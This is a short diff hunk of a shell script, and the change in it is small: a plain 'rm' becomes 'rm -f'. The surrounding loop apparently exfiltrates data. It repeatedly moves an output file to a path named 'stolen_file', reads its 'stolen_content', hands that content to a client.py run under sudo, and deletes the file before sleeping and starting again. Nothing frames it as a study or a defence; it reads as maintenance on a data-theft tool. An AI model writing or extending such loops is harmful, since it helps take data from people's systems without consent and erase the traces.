@@ -10,7 +10,7 @@ do
     mv out.txt "$stolen_file"
     stolen_content=$(cat "$stolen_file")
     sudo python3 client.py "$stolen_content"
-    rm "$stolen_file"
+    rm -f "$stolen_file"
   fi
   sleep 10
 done
